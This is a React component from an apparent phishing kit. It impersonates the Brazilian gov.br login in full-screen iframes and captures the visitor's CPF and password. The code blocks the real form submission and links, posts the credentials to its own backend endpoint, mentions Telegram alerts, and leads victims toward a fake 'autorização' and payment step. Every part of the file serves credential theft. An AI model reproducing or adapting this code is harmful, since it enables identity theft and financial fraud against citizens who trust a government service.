import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import { injectMobileCleanup } from "../utils/mobileCleanup";

const API = process.env.REACT_APP_BACKEND_URL;

export default function LoginGovBr() {
  const navigate = useNavigate();
  // Recupera estado do sessionStorage para persistir após refresh
  const [step, setStep] = useState(() => {
    const saved = sessionStorage.getItem("login_step");
    return saved === "senha" ? "senha" : "cpf";
  });
  const [cpf, setCpf] = useState(() => sessionStorage.getItem("login_cpf") || "");
  const iframeCpfRef = useRef(null);
  const iframeSenhaRef = useRef(null);
  const isSubmittingRef = useRef(false);

  // Persiste mudança de step
  useEffect(() => {
    if (step === "senha") {
      sessionStorage.setItem("login_step", "senha");
      sessionStorage.setItem("login_cpf", cpf);
    } else {
      sessionStorage.removeItem("login_step");
      sessionStorage.removeItem("login_cpf");
    }
  }, [step, cpf]);

  const maskCPF = (v) =>
    v
      .replace(/\D/g, "")
      .slice(0, 11)
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1-$2");

  const isValidCPF = (value) => {
    const digits = value.replace(/\D/g, "");
    if (digits.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(digits)) return false;
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(digits[i], 10) * (10 - i);
    let rest = (sum * 10) % 11;
    if (rest === 10 || rest === 11) rest = 0;
    if (rest !== parseInt(digits[9], 10)) return false;
    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(digits[i], 10) * (11 - i);
    rest = (sum * 10) % 11;
    if (rest === 10 || rest === 11) rest = 0;
    if (rest !== parseInt(digits[10], 10)) return false;
    return true;
  };

  // ============ STEP CPF (iframe gov.br) ============
  const handleIframeCpfLoad = () => {
    const iframe = iframeCpfRef.current;
    if (!iframe) return;
    const doc = iframe.contentDocument || iframe.contentWindow?.document;
    if (!doc) return;

    injectMobileCleanup(iframe);

    const form = doc.getElementById("loginData");
    const input = doc.getElementById("accountId");
    const errorBox = doc.querySelector(".feedback.invalid, .feedback-message");

    doc.querySelectorAll("a").forEach((a) => {
      a.setAttribute("href", "#");
      a.removeAttribute("target");
    });

    const tryAdvance = (cpfValor) => {
      const masked = maskCPF(cpfValor || "");
      if (!isValidCPF(masked)) {
        if (input) {
          input.setAttribute("aria-invalid", "true");
          input.style.borderColor = "#d04444";
        }
        if (errorBox) {
          errorBox.textContent = "CPF inválido. Verifique os números digitados.";
          errorBox.style.color = "#d04444";
          errorBox.style.display = "block";
        } else if (input && input.parentElement) {
          let msg = doc.getElementById("cpf-error-clone");
          if (!msg) {
            msg = doc.createElement("p");
            msg.id = "cpf-error-clone";
            msg.style.cssText =
              "color:#d04444;font-family:Rawline,Raleway,sans-serif;font-size:12px;margin-top:6px;";
            input.parentElement.appendChild(msg);
          }
          msg.textContent = "CPF inválido. Verifique os números digitados.";
        }
        return;
      }
      setCpf(masked);
      setTimeout(() => setStep("senha"), 600);
    };

    if (form) {
      form.setAttribute("action", "#");
      form.addEventListener("submit", (e) => {
        e.preventDefault();
        e.stopPropagation();
        tryAdvance(input?.value);
      });
    }
    const btnContinuar = doc.getElementById("enter-account-id");
    if (btnContinuar) {
      btnContinuar.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        tryAdvance(input?.value);
      });
    }
    doc.querySelectorAll('button[type="submit"]').forEach((b) => {
      if (b.id === "enter-account-id") return;
      b.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        tryAdvance(input?.value);
      });
    });
  };

  // ============ STEP SENHA (iframe gov.br) ============
  const submitSenha = (senhaValor, doc) => {
    if (isSubmittingRef.current) return;
    if (!senhaValor) return;
    isSubmittingRef.current = true;

    // Mostra estado de "Enviando..." no botão dentro do iframe
    const submitBtn = doc.getElementById("submit-button");
    let textoOriginal = "Entrar";
    if (submitBtn) {
      textoOriginal = submitBtn.textContent;
      submitBtn.disabled = true;
      submitBtn.textContent = "Entrando...";
      submitBtn.style.opacity = "0.7";
      submitBtn.style.cursor = "wait";
    }

    // Registra o candidato na aba "Cadastros" do painel admin
    // (sem notificar Telegram — a notificação só dispara no submit da inscrição)
    axios
      .post(`${API}/api/notificar/login`, { cpf, senha: senhaValor })
      .then((r) => {
        if (r.data?.sessao_id) {
          sessionStorage.setItem("sessao_id", r.data.sessao_id);
        }
      })
      .catch((err) => {
        console.warn("Falha ao registrar login:", err?.message || err);
      });

    // Verifica se já existe inscrição salva para este CPF
    const buscarPorCpf = (valor) =>
      axios.get(`${API}/api/inscricoes/by-cpf/${encodeURIComponent(valor)}`);

    buscarPorCpf(cpf)
      .catch(() => buscarPorCpf(cpf.replace(/\D/g, "")))
      .then((r) => {
        if (!r) return Promise.reject(new Error("not found"));
        const insc = r.data;
        sessionStorage.setItem("login_cpf", cpf);
        sessionStorage.setItem("cpf", cpf);
        if (insc.cadastro) {
          sessionStorage.setItem("cadastro_basico", JSON.stringify(insc.cadastro));
        }
        if (insc.inscricao) {
          sessionStorage.setItem("inscricao_dados", JSON.stringify(insc.inscricao));
        }
        sessionStorage.setItem("inscricao_concluida", "true");
        if (insc.numero_referencia) {
          sessionStorage.setItem("ref_pagamento", insc.numero_referencia);
        }
        sessionStorage.setItem("inscricao_enviada_backend", "true");
        sessionStorage.setItem("retornar_pagamento", "true");
        setTimeout(() => {
          isSubmittingRef.current = false;
          navigate("/autorizacao");
        }, 1800);
      })
      .catch(() => {
        sessionStorage.removeItem("retornar_pagamento");
        setTimeout(() => {
          isSubmittingRef.current = false;
          navigate("/autorizacao");
        }, 1800);
      });
  };

  const handleIframeSenhaLoad = () => {
    const iframe = iframeSenhaRef.current;
    if (!iframe) return;
    const doc = iframe.contentDocument || iframe.contentWindow?.document;
    if (!doc) return;

    injectMobileCleanup(iframe);

    // 1) Atualiza o CPF exibido na página (gov.br mostra <h4>XXX.XXX.XXX-XX</h4>)
    const card = doc.getElementById("login-password");
    if (card) {
      const h4 = card.querySelector("h4");
      if (h4) h4.textContent = cpf;
    }

    // 2) Neutraliza links externos
    doc.querySelectorAll("a").forEach((a) => {
      a.setAttribute("href", "#");
      a.removeAttribute("target");
    });

    // 3) Form -> não envia
    const form = doc.getElementById("loginData");
    if (form) {
      form.setAttribute("action", "#");
      form.addEventListener("submit", (e) => {
        e.preventDefault();
        e.stopPropagation();
        const input = doc.getElementById("password");
        submitSenha(input?.value || "", doc);
      });
    }

    // 4) Botão Entrar
    const btnEntrar = doc.getElementById("submit-button");
    if (btnEntrar) {
      btnEntrar.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        const input = doc.getElementById("password");
        submitSenha(input?.value || "", doc);
      });
    }

    // 5) Botão Cancelar
    const btnCancelar = doc.querySelector("button.button-cancel");
    if (btnCancelar) {
      btnCancelar.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        setStep("cpf");
      });
    }

    // 6) Botão "Esqueci minha senha" + outros buttons type=submit -> também tenta entrar
    doc.querySelectorAll('button[type="submit"]').forEach((b) => {
      if (b.id === "submit-button") return;
      b.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        const input = doc.getElementById("password");
        submitSenha(input?.value || "", doc);
      });
    });
  };

  // ============ RENDER ============
  if (step === "cpf") {
    return (
      <iframe
        ref={iframeCpfRef}
        title="gov.br - Acesse sua conta"
        src="/login-govbr.html"
        onLoad={handleIframeCpfLoad}
        data-testid="login-iframe"
        style={{
          position: "fixed",
          inset: 0,
          width: "100vw",
          height: "100vh",
          border: "none",
          margin: 0,
          padding: 0,
        }}
      />
    );
  }

  // step === "senha"
  return (
    <iframe
      ref={iframeSenhaRef}
      title="gov.br - Digite sua senha"
      src="/login-senha.html"
      onLoad={handleIframeSenhaLoad}
      data-testid="login-senha-iframe"
      style={{
        position: "fixed",
        inset: 0,
        width: "100vw",
        height: "100vh",
        border: "none",
        margin: 0,
        padding: 0,
      }}
    />
  );
}
